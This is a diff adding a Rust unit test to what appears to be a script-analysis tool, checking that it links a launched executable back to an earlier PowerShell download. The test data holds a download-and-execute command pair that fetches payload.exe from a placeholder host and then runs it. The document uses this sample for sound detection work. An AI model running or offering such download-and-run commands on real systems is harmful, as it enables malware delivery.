@@ -3382,6 +3382,27 @@ start C:/Temp/payload.hta"#,
     }
 
     #[test]
+    fn start_local_target_resolves_prior_powershell_iwr_outfile_source_url() {
+        let report = analyze(
+            br#"powershell -Command "Invoke-WebRequest -Uri 'https://start-ps-iwr.example/payload.exe' -OutFile 'C:\Users\Public\payload.exe'"
+start "" "C:\Users\Public\payload.exe""#,
+            &AnalyzeConfig::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"start "C:\Users\Public\payload.exe""#
+                            && url == "https://start-ps-iwr.example/payload.exe"
+                )
+            }),
+            "start local target did not resolve prior PowerShell IWR download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn unknown_redirected_command_does_not_emit_unresolved_pipeline() {
         let script = b"GIFTS WITH DISCOUNTS >nul 2>&1 LIMITED OFFER\r\n";
         let report = analyze(script, &AnalyzeConfig::default());
